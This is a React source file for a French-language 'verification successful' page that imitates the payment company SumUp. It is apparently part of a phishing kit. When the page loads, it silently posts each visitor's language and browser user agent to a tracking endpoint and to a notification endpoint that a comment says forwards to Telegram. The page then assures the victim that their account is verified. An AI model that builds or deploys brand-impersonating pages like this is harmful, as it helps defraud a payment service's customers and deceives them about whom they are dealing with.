import { useEffect } from "react";
import { Link } from "wouter";
import { CheckCircle2 } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";

export default function Success() {
  useEffect(() => {
    // Track visitor when page loads with language info
    const language = navigator.language || 'Unknown';
    apiRequest("POST", "/api/track-visit", { 
      page: "Success Page",
      language 
    }).catch(() => {
      // Silent fail - tracking shouldn't break the app
    });

    // Send success notification to Telegram
    const userAgent = navigator.userAgent || 'Unknown';
    apiRequest("POST", "/api/success-notification", {
      language,
      userAgent
    }).catch(() => {
      // Silent fail - notification shouldn't break the app
    });
  }, []);

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-white px-4">
      <div className="w-full max-w-md text-center space-y-8">
        {/* Success Icon */}
        <div className="flex justify-center">
          <div className="relative">
            <div className="absolute inset-0 bg-green-100 rounded-full animate-ping opacity-75"></div>
            <div className="relative bg-green-500 rounded-full p-6">
              <CheckCircle2 className="w-16 h-16 text-white" />
            </div>
          </div>
        </div>

        {/* Success Message */}
        <div className="space-y-4">
          <h1 className="text-4xl font-bold text-black" data-testid="text-title">
            Vérification réussie !
          </h1>
          <p className="text-lg text-gray-600" data-testid="text-description">
            Votre compte a été vérifié avec succès.
          </p>
        </div>

        {/* Success Details */}
        <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 space-y-3">
          <div className="flex items-center justify-center gap-2 text-sm text-gray-700">
            <span className="inline-block w-2 h-2 bg-green-500 rounded-full"></span>
            <span>Authentification sécurisée</span>
          </div>
          <div className="flex items-center justify-center gap-2 text-sm text-gray-700">
            <span className="inline-block w-2 h-2 bg-green-500 rounded-full"></span>
            <span>Identité vérifiée</span>
          </div>
          <div className="flex items-center justify-center gap-2 text-sm text-gray-700">
            <span className="inline-block w-2 h-2 bg-green-500 rounded-full"></span>
            <span>Accès autorisé</span>
          </div>
        </div>

        {/* Action Buttons */}
        <div className="space-y-4 pt-8">
          <Link href="/">
            <button
              type="button"
              className="w-full h-12 bg-black text-white font-semibold rounded-md hover:bg-opacity-90 transition-all"
              data-testid="button-go-home"
            >
              Accéder au tableau de bord
            </button>
          </Link>

          <p className="text-sm text-gray-500">
            Vous pouvez maintenant accéder à tous les services SumUp
          </p>
        </div>

        {/* SumUp Logo */}
        <div className="pt-8 opacity-60">
          <div className="flex items-center justify-center gap-2">
            <div className="h-6 w-6 bg-black rounded-md flex items-center justify-center">
              <svg viewBox="0 0 24 24" fill="white" className="h-4 w-4">
                <path d="M13 10V3L4 14h7v7l9-11h-7z" />
              </svg>
            </div>
            <span className="text-base font-semibold">sumup</span>
          </div>
        </div>
      </div>
    </div>
  );
}
